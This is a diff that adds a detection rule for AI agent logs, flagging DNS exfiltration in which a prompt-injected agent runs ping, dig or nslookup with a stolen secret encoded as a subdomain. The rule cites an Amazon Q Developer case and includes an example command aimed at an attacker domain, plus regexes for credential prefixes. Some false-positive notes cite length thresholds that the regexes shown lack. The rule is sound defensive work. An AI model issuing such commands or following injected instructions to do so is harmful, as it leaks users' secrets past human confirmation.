@@ -1,0 +1,39 @@
+title: DNS Exfiltration via Ping/Dig/Nslookup Command with Data-Encoded Subdomain Label
+id: 2172d59a-5975-4f16-9621-555320b53461
+status: experimental
+level: critical
+description: |-
+  Detects an agent being directed to run a network-diagnostic command (ping, dig, or nslookup) whose target hostname carries an encoded secret as the leftmost subdomain label -- either a long dash-segmented alphanumeric blob (the classic "replace = with -" trick that turns a base64/API-key value into a DNS-safe label) or a recognizable cloud/API credential prefix embedded directly in the hostname. Mined from AWS Security Bulletin AWS-2025-019 (Amazon Q Developer and Kiro IDE plugins), which documents Embrace The Red's "Amazon Q Developer: Secrets Leaked via DNS and Prompt Injection" research -- Amazon Q classified ping/dig as "read-only" and let a prompt-injected instruction exfiltrate a stolen .env value by constructing `ping <secret-with-dashes>.attacker-domain` so the secret left the host as a DNS query, requiring no outbound HTTP call and no human confirmation. Generalizes beyond Amazon Q to any agent/IDE that treats ping/dig/nslookup as safe-by-default. Ordinary network troubleshooting (`ping google.com`, `dig +short example.com`, `ping my-server-01.internal.corp`) does not carry a long high-entropy or credential-shaped label and must not fire.
+
+  Adapted from Agent Threat Rules ATR-2026-02190 (MIT).
+author: ATR Community (adapted)
+date: '2026-07-11'
+references:
+- https://agentthreatrule.org/en/rules/ATR-2026-02190
+- https://aws.amazon.com/security/security-bulletins/rss/aws-2025-019/
+- https://embracethered.com/blog/posts/2025/amazon-q-developer-data-exfil-via-dns/
+tags:
+- attack.exfiltration
+- attack.t1048.003
+- atlas.aml.t0057
+- owasp.asi03
+- owasp.llm02
+logsource:
+  product: ai_agent
+  category: agent_events
+detection:
+  sel_0:
+    content|re: \b(?:ping|dig|nslookup)\b[\s\S]{0,20}\b(?:AKIA[0-9A-Z]{12,}|sk-[A-Za-z0-9_-]{16,}|ghp_[A-Za-z0-9]{20,}|xox[baprs]-[A-Za-z0-9-]{10,}|eyJ[A-Za-z0-9_-]{10,})
+  sel_1:
+    content|re: (?i)replac\w*[\s\S]{0,15}=[\s\S]{0,10}with[\s\S]{0,10}-[\s\S]{0,60}\b(?:ping|dig|nslookup)\b
+  condition: 1 of sel_*
+falsepositives:
+- 'Ordinary network troubleshooting: ''ping google.com'', ''dig +short example.com'', ''nslookup 8.8.8.8'''
+- Internal hostnames with short dash-separated segments (e.g. 'ping my-server-01.internal.corp') do not
+  meet the 10+/4+/4+ character segment thresholds
+- Ordinary long service/deployment names common in cloud infra (e.g. 'dig authentication-service-7d4b8c9d6f-abc12.prod.svc.cluster.local',
+  'ping development-server-workload-01.example.com') read as plain lowercase English words/short hex hashes,
+  not a mixed-case or 16+ char hex encoded blob
+- A security engineer discussing this exact DNS-exfiltration technique in an incident-response writeup,
+  without actually issuing the command
+action: report
